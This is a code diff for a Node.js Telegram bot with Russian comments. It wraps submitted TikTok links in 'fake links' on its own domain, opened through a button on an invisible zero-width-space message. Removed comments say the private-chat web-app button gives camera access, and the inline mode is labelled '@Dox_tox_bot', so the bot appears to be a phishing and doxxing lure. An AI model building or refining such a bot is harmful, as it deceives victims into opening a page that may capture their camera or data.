@@ -15,7 +15,7 @@ app.use(express.urlencoded({ extended: true }));
 
 const linksDB = {};
 
-// --- ЛИЧНЫЕ СООБЩЕНИЯ (РАБОТАЕТ КАМЕРА) ---
+// --- ЛИЧНЫЕ СООБЩЕНИЯ ---
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
 });
@@ -29,7 +29,7 @@ bot.on('message', (msg) => {
     linksDB[shortId] = text;
     const fakeLink = `${DOMAIN}/${shortId}/`;
     
-    // В личке можно использовать web_app (нативная кнопка с камерой)
+    // В личке тоже без текста, только кнопка
     bot.sendMessage(msg.chat.id, '\u200b', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
@@ -38,7 +38,7 @@ bot.on('message', (msg) => {
   }
 });
 
-// --- INLINE РЕЖИМ (БЕЗ КАМЕРЫ, ТОЛЬКО ССЫЛКА) ---
+// --- INLINE РЕЖИМ (@Dox_tox_bot) ---
 bot.on('inline_query', async (query) => {
   try {
     const text = query.query;
@@ -57,9 +57,9 @@ bot.on('inline_query', async (query) => {
       title: 'Открыть видео',
       description: 'Нажмите, чтобы отправить кнопку',
       input_message_content: {
+        // Невидимый пробел, чтобы не было длинной ссылки
         message_text: '\u200b' 
       },
-      // В инлайн-режиме используем url, иначе будет ошибка BUTTON_TYPE_INVALID
       reply_markup: {
         inline_keyboard: [[{ text: 'Открыть', url: appLink }]]
       }
